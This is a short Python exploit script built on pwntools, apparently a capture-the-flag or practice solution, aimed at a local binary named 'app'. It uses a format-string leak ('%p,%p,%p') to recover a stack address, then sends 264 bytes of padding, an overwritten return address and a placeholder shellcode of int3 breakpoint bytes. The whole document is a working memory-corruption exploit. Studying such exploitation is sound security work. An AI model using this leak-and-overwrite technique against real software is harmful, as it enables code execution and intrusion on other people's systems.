from pwn  import *
from ripper import *
import struct

io = process('./app')
raw_input("Press return to continue... ")
(io.recvregex(b':'))
info ("Relaying Format String...")
io.sendline(b'%p,%p,%p')
io.recvline()
leak=io.recvline().split(b',')[1]
print(leak)
io.recvregex(b':')
start_buf=(int(leak,16))+264-9 #rip_offset
info("Leaked start of buffer: 0x{:08x}".format(start_buf))
padding=b'a'*264
RIP=struct.pack(b'Q',start_buf+8)
shellcode=b'\xcc'*64
payload=padding+RIP+shellcode
io.sendline(payload)


